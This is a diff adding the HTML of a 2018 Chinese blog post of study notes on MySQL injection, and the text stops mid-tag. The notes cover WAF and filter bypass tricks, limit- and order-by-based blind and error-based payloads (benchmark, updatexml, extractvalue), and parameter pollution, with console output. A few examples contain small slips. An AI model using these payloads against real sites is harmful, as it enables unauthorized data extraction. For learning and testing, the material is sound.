@@ -1,0 +1,1278 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Owasp top 10,SQL注入," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="spira1" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="之前刘师傅在群里发了个gayhub项目地址，里面有很多学习干货，很基础的东西，我感觉自己基础不行，就打打基础吧。里面看到了一篇SQL注入的技巧总结不错，再总结的基础上总结一下 常用注入关键字常量：true、false、null、current_timestamp 1234567mysql&amp;gt; select current_timestamp;+---------------------+| c">
+<meta name="keywords" content="Owasp top 10,SQL注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入被我忽略的一点tips">
+<meta property="og:url" content="http://eagerseven.cn/2018/03/13/SQL注入被我遗忘的一些tips/index.html">
+<meta property="og:site_name" content="spira1">
+<meta property="og:description" content="之前刘师傅在群里发了个gayhub项目地址，里面有很多学习干货，很基础的东西，我感觉自己基础不行，就打打基础吧。里面看到了一篇SQL注入的技巧总结不错，再总结的基础上总结一下 常用注入关键字常量：true、false、null、current_timestamp 1234567mysql&amp;gt; select current_timestamp;+---------------------+| c">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNc79gy1fpdrb9esccj30qz0gdq4n.jpg">
+<meta property="og:updated_time" content="2018-10-31T11:54:03.540Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQL注入被我忽略的一点tips">
+<meta name="twitter:description" content="之前刘师傅在群里发了个gayhub项目地址，里面有很多学习干货，很基础的东西，我感觉自己基础不行，就打打基础吧。里面看到了一篇SQL注入的技巧总结不错，再总结的基础上总结一下 常用注入关键字常量：true、false、null、current_timestamp 1234567mysql&amp;gt; select current_timestamp;+---------------------+| c">
+<meta name="twitter:image" content="https://ws2.sinaimg.cn/large/006tNc79gy1fpdrb9esccj30qz0gdq4n.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://eagerseven.cn/2018/03/13/SQL注入被我遗忘的一些tips/"/>
+
+
+
+
+
+  <title>SQL注入被我忽略的一点tips | spira1</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<script type="text/javascript" src="/lib/clipboard/clipboard.js"></script>
+<script type="text/javascript" src="/js/src/custom.js"></script>
+
+
+
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+
+
+
+<div id="hexo-helper-live2d">
+  <canvas id="live2dcanvas" width="150" height="300"></canvas>
+</div>
+<style>
+  #live2dcanvas{
+    position: fixed;
+    width: 150px;
+    height: 300px;
+    opacity:0.7;
+    right: 0px;
+    z-index: 999;
+    pointer-events: none;
+    bottom: -20px;
+  }
+</style>
+<script type="text/javascript" src="/live2d/device.min.js"></script>
+<script type="text/javascript">
+const loadScript = function loadScript(c,b){var a=document.createElement("script");a.type="text/javascript";"undefined"!=typeof b&&(a.readyState?a.onreadystatechange=function(){if("loaded"==a.readyState||"complete"==a.readyState)a.onreadystatechange=null,b()}:a.onload=function(){b()});a.src=c;document.body.appendChild(a)};
+(function(){
+  if((typeof(device) != 'undefined') && (device.mobile())){
+    var trElement = document.getElementById('hexo-helper-live2d');
+    trElement.parentNode.removeChild(trElement);
+    return;
+  }else
+    if (typeof(device) === 'undefined') console.error('Cannot find current-device script.');
+  loadScript("/live2d/script.js", function(){loadlive2d("live2dcanvas", "/live2d/assets/hijiki.model.json", 0.5);});
+})();
+</script>
+
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">spira1</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-music"></i> <br />
+            
+            Music
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://eagerseven.cn/2018/03/13/SQL注入被我遗忘的一些tips/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="spira1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="spira1">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SQL注入被我忽略的一点tips</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-03-13T21:15:00+08:00">
+                2018-03-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  3,451
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>之前刘师傅在群里发了个gayhub项目地址，里面有很多学习干货，很基础的东西，我感觉自己基础不行，就打打基础吧。里面看到了一篇SQL注入的技巧总结不错，再总结的基础上总结一下</p>
+<h3 id="常用注入关键字"><a href="#常用注入关键字" class="headerlink" title="常用注入关键字"></a>常用注入关键字</h3><p><strong>常量：</strong>true、false、null、current_timestamp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select current_timestamp;</span><br><span class="line">+---------------------+</span><br><span class="line">| current_timestamp   |</span><br><span class="line">+---------------------+</span><br><span class="line">| 2018-03-12 23:41:24 |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p><strong>变量：</strong>@myvar:=2(这个语句相当于给myvar变量赋值)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select @myvar:=2;</span><br><span class="line">+-----------+</span><br><span class="line">| @myvar:=2 |</span><br><span class="line">+-----------+</span><br><span class="line">|         2 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select @myvar=2;</span><br><span class="line">+----------+</span><br><span class="line">| @myvar=2 |</span><br><span class="line">+----------+</span><br><span class="line">|        1 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select @myvar=1;</span><br><span class="line">+----------+</span><br><span class="line">| @myvar=1 |</span><br><span class="line">+----------+</span><br><span class="line">|        0 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select @myvar;</span><br><span class="line">+--------+</span><br><span class="line">| @myvar |</span><br><span class="line">+--------+</span><br><span class="line">|      2 |</span><br><span class="line">+--------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p><strong>系统变量：</strong>@@version、@@datadir</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; mysql&gt; select @@version;</span><br><span class="line">+-----------+</span><br><span class="line">| @@version |</span><br><span class="line">+-----------+</span><br><span class="line">| 5.7.21    |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select @@datadir;</span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">| @@datadir                                       |</span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">| /usr/local/mysql-5.7.21-macos10.13-x86_64/data/ |</span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p><strong>常用函数：</strong>version()、pi()、pow()、char()、substring()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select pow(2,3);</span><br><span class="line">+----------+</span><br><span class="line">| pow(2,3) |</span><br><span class="line">+----------+</span><br><span class="line">|        8 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select char(72);</span><br><span class="line">+----------+</span><br><span class="line">| char(72) |</span><br><span class="line">+----------+</span><br><span class="line">| H        |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select substring(&apos;qwerty&apos;,3,3);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substring(&apos;qwerty&apos;,3,3) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| ert                     |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p><strong>字符串生成：</strong>hex(x)、conv(x,y,z)（分别为转换成16进制和x从y进制转换为z进制）、seil()、floor()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select hex(72);</span><br><span class="line">+---------+</span><br><span class="line">| hex(72) |</span><br><span class="line">+---------+</span><br><span class="line">| 48      |</span><br><span class="line">+---------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select conv(5,16,2);</span><br><span class="line">+--------------+</span><br><span class="line">| conv(5,16,2) |</span><br><span class="line">+--------------+</span><br><span class="line">| 101          |</span><br><span class="line">+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select ceil(3.14);</span><br><span class="line">+------------+</span><br><span class="line">| ceil(3.14) |</span><br><span class="line">+------------+</span><br><span class="line">|          4 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select floor(3.14);</span><br><span class="line">+-------------+</span><br><span class="line">| floor(3.14) |</span><br><span class="line">+-------------+</span><br><span class="line">|           3 |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<h3 id="常用绕过字符过滤"><a href="#常用绕过字符过滤" class="headerlink" title="常用绕过字符过滤"></a>常用绕过字符过滤</h3><p><strong>空格：</strong>%20, %09, %0a, %0b, %0c, %0d, %a0,(),/<em>*/</em><br><strong>and，or：</strong>||，&amp;&amp;<br><strong>等号：</strong>可以用between and或者like绕过</p>
+<p><strong>union select：</strong><br>​    括号：’and(true)like(false)union(select(pass)from(users))，<br>​    方括号：union [all|distinct] select pass from users#，<br>​    空格：union%a0select pass from users，<br>​    或者内联注释：union/<em>&amp;sort=</em>/select pass from users#<br><strong>union：</strong>子查询进行盲注and length((select pass from users having substr(pass,1,1)=’a’))<br><strong>having：</strong>and(select substr(group_concat(pass),1,1)from users)=’a<br><strong>select … from(过滤代码如/SELECTs+[A-Za-z.]+s+FROM/i/i)：</strong><br>​    select [all|distinct] pass from users<br>​    select`table_name`from`information_schema` . `tables`<br>​    select pass as alias from users<br>​    select pass aliasalias from users<br>​    select pass`alias alias`from users<br>​    select+pass%a0from(users)<br><strong>select,and,&amp;：</strong>  可以利用前面的基于false的注入方法<br><strong>逗号：</strong>‘ and substr(data from 1 for 1)=’a’#<br><strong>字符串连接函数：</strong><br>​    select ‘a’’b’’c’’d’;<br>​    select concat(‘a’,’b’,’c’,’d’);        //需要注意的是如果连接的字符串中有null，那么返回结果就为null<br>​    select concat_ws(‘’,’a’,’b’,’c’,’d’);        //前面必须要有一个空字符，否则输出的字符串不是预期<br>​    select group_concat(‘a’,’b’,’c’,’d’);</p>
+<p><strong>http参数污染：</strong>当容器框架为apache/PHP时，同时注入两个参数（例如id=1&amp;id=union select。。。。），服务器waf的网络层会解析id=1，而PHP应用层会解析后面的查询语句。类似的还有</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=1&amp;id=2&amp;id=3</span><br><span class="line">asp.net+iis:id=1,2,3</span><br><span class="line">asp+iis:id=1,2,3</span><br><span class="line">php+apache:id=3</span><br><span class="line">jsp+tomcat:id=1</span><br></pre></td></tr></table></figure>
+<p>下图是绕过关键字过滤的例子：</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fpdrb9esccj30qz0gdq4n.jpg" alt=""></p>
+<h3 id="注入技巧"><a href="#注入技巧" class="headerlink" title="注入技巧"></a>注入技巧</h3><h4 id="limit注入"><a href="#limit注入" class="headerlink" title="limit注入"></a>limit注入</h4><p>在limit注入中，limit后面跟两个函数<code>procedure</code>和<code>into</code>，但into要有写权限才能利用</p>
+<p>之前班上小组出题中，刘师傅出过一道limit注入的题，当时构造的语句是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)</span><br></pre></td></tr></table></figure>
+<p>但是当时的题目不支持报错注入，用的基于时间的注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) = 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</span><br></pre></td></tr></table></figure>
+<p>值得注意的是，当利用limit的时间注入时，sleep函数是不行的，只能用benchmark函数来延时</p>
+<p>此外，limit参数还可以用于确定字段数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from db limit 1 into @;</span><br><span class="line">ERROR 1222 (21000): The used SELECT statements have a different number of columns</span><br><span class="line">mysql&gt; select * from db limit 1 into @,@,@,@,@,@,@,@,@,@,@,@,@,@,@,@,@,@,@,@,@,@;</span><br><span class="line">ERROR 3061 (42000): User variable name &apos;&apos; is illegal</span><br></pre></td></tr></table></figure>
+<p>说明这个列的字段数为22</p>
+<p>此外可以判断已知表名的字段数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select Db from db where Db=1 and (select * from db)=1;</span><br><span class="line">ERROR 1241 (21000): Operand should contain 22 column(s)</span><br></pre></td></tr></table></figure>
+<p>说明此字段数为22</p>
+<h4 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a>order by注入</h4><p>order by注入中值得注意的几点：</p>
+<p><code>order by 3-1</code>和<code>order by 2</code>是不一样的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">order by if(1=1,name,price)		//通过name字段排序</span><br><span class="line">order by if(1=1,name,price)		//通过price字段排序</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">order by(case when (1=1) then name else price end)	//通过name字段排序</span><br><span class="line">order by(case when (1=2) then name else price end)	//通过price字段排序</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">order by ifnull(null,price)		//通过price字段排序</span><br><span class="line">order by ifnull(null,name)		//通过name字段排序</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>基于报错的注入：</p>
+<p><strong>返回多条记录</strong></p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select Db,User from db order by if(1=1,1,(select 1 union select 2));</span><br><span class="line">+--------------------+---------------+</span><br><span class="line">| Db                 | User          |</span><br><span class="line">+--------------------+---------------+</span><br><span class="line">| test               | 2test         |</span><br><span class="line">| performance_schema | mysql.session |</span><br><span class="line">| sys                | mysql.sys     |</span><br><span class="line">+--------------------+---------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select Db,User from db order by if(1=2,1,(select 1 union select 2));</span><br><span class="line">ERROR 1242 (21000): Subquery returns more than 1 row</span><br><span class="line">mysql&gt; select Db,User from db order by if(1=1,1,(select 1 from information_schema.tables));</span><br><span class="line">+--------------------+---------------+</span><br><span class="line">| Db                 | User          |</span><br><span class="line">+--------------------+---------------+</span><br><span class="line">| test               | 2test         |</span><br><span class="line">| performance_schema | mysql.session |</span><br><span class="line">| sys                | mysql.sys     |</span><br><span class="line">+--------------------+---------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select Db,User from db order by if(1=2,1,(select 1 from information_schema.tables));</span><br><span class="line">ERROR 1242 (21000): Subquery returns more than 1 row</span><br></pre></td></tr></table></figure>
+<p>​    <strong>regexp函数</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select Db,User from db order by(select 1 regexp if(1=1,1,0x00));</span><br><span class="line">+--------------------+---------------+</span><br><span class="line">| Db                 | User          |</span><br><span class="line">+--------------------+---------------+</span><br><span class="line">| test               | 2test         |</span><br><span class="line">| performance_schema | mysql.session |</span><br><span class="line">| sys                | mysql.sys     |</span><br><span class="line">+--------------------+---------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select Db,User from db order by(select 1 regexp if(1=2,1,0x00));</span><br><span class="line">ERROR 1139 (42000): Got error &apos;empty (sub)expression&apos; from regexp</span><br></pre></td></tr></table></figure>
+<p>​    <strong>updatexml</strong></p>
+<p>之前班上小组出题也遇到过updatexml注入的问题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML (XML_document, XPath_string, new_value); </span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc </span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串) </span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的数据 </span><br><span class="line">作用：改变文档中符合条件的节点的值</span><br><span class="line"></span><br><span class="line">然后咱们再看看语句：</span><br><span class="line"></span><br><span class="line">http://www.XXXIII.com/a.php?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</span><br><span class="line"></span><br><span class="line">CONCAT(str1,str2,…)  </span><br><span class="line"></span><br><span class="line">返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。</span><br><span class="line"></span><br><span class="line">通过查询@@version,返回版本。然后CONCAT将其字符串化。因为UPDATEXML第二个参数需要Xpath格式的字符串,所以不符合要求，然后报错。</span><br><span class="line"></span><br><span class="line">错误大概会是：</span><br><span class="line"></span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: ’:root@localhost’</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select Db,User from db order by updatexml(1,if(1=1,1,user()),1);</span><br><span class="line">+--------------------+---------------+</span><br><span class="line">| Db                 | User          |</span><br><span class="line">+--------------------+---------------+</span><br><span class="line">| test               | 2test         |</span><br><span class="line">| performance_schema | mysql.session |</span><br><span class="line">| sys                | mysql.sys     |</span><br><span class="line">+--------------------+---------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select Db,User from db order by updatexml(1,if(1=2,1,user()),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;@localhost&apos;</span><br></pre></td></tr></table></figure>
+<p>​    <strong>extractvalue</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select Db,User from db order by extractvalue(rand(),if(1=1,1,user()));</span><br><span class="line">+--------------------+---------------+</span><br><span class="line">| Db                 | User          |</span><br><span class="line">+--------------------+---------------+</span><br><span class="line">| test               | 2test         |</span><br><span class="line">| performance_schema | mysql.session |</span><br><span class="line">| sys                | mysql.sys     |</span><br><span class="line">+--------------------+---------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span 